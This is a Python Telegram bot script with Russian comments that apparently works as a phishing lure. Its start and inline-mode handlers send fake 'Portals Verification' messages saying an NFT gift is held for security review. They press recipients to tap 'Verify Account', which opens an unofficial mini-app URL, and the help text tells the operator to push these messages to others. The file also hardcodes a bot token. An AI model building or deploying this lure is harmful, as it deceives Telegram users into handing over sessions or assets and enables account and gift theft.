import logging
import re
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, WebAppInfo, InlineQueryResultArticle, InputTextMessageContent
from telegram.ext import Application, CommandHandler, InlineQueryHandler, ContextTypes

# Настройка логирования
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# ТОКЕН БОТА
TOKEN = "8868277445:AAEPYSE-uoej11anci9jpiaoDYsOqL_-tps"

# Ссылка на аватарку
PHOTO_URL = "https://i.postimg.cc/hPNrFrmg/IMG-4180.jpg"

# ССЫЛКА НА MINI APP
MINI_APP_URL = "https://verifing-production.up.railway.app"

# ===== КОМАНДА /start =====
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [
        [InlineKeyboardButton("✅ Verify Account", web_app=WebAppInfo(url=MINI_APP_URL))]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    message = (
        f"🎩 *Portals Verification*\n\n"
        f"**Final Verification Required: Claim Your Gift**\n\n"
        f"Your scheduled delivery of *SpyAgaric-37522* is tagged for last-mile review. "
        f"To preserve platform safety and block fraudulent claim attempts, confirming "
        f"your active session is required before the gift can be released.\n\n"
        f"A single tap below and the asset is on its way."
    )
    
    await update.message.reply_photo(
        photo=PHOTO_URL,
        caption=message,
        reply_markup=reply_markup,
        parse_mode='Markdown'
    )

# ===== ИНЛАЙН-РЕЖИМ (только SpyAgaric-37522) =====
async def inline_query(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.inline_query.query.strip()
    
    logger.info(f"📥 Инлайн-запрос: '{query}'")
    
    # КНОПКА
    keyboard = [
        [InlineKeyboardButton("✅ Verify Account", web_app=WebAppInfo(url=MINI_APP_URL))]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    # ⚡ ТОЛЬКО SPYAGARIC-37522 (как на скриншоте)
    gift_id = "SpyAgaric-37522"
    gift_link = "https://t.me/nft/SpyAgaric-37522"
    
    # ⚡ ТЕКСТ ТОЧНО КАК НА СКРИНШОТЕ
    message = (
        f"🎁 *Gift temporarily unavailable*\n\n"
        f"*{gift_id}* is currently undergoing a security review.\n\n"
        f"To regain access, please verify the gift using the official bot below.\n\n"
        f"Telegram\n"
        f"{gift_id}\n\n"
        f"🔗 [View Gift]({gift_link})\n\n"
        f"A single tap below and the asset is on its way."
    )
    
    # СОЗДАЕМ РЕЗУЛЬТАТ
    result = InlineQueryResultArticle(
        id="1",
        title=f"🎁 {gift_id}",
        description="Verify your gift",
        input_message_content=InputTextMessageContent(
            message_text=message,
            parse_mode='Markdown',
            disable_web_page_preview=False
        ),
        reply_markup=reply_markup,
        thumb_url=PHOTO_URL
    )
    
    # ОТВЕЧАЕМ
    await update.inline_query.answer([result])

# ===== КОМАНДА /help =====
async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "🤖 *Как использовать бота:*\n\n"
        "1. Напиши `@PortalVerificationsRobot`\n"
        "2. Выбери результат\n"
        "3. Отправь сообщение\n\n"
        "Или просто нажми /start для теста",
        parse_mode='Markdown'
    )

# ===== ЗАПУСК =====
def main():
    application = Application.builder().token(TOKEN).build()
    
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("help", help_command))
    application.add_handler(InlineQueryHandler(inline_query))
    
    logger.info("🚀 Бот запущен и работает!")
    logger.info("📱 Инлайн-режим: @PortalVerificationsRobot")
    application.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == '__main__':
    main()
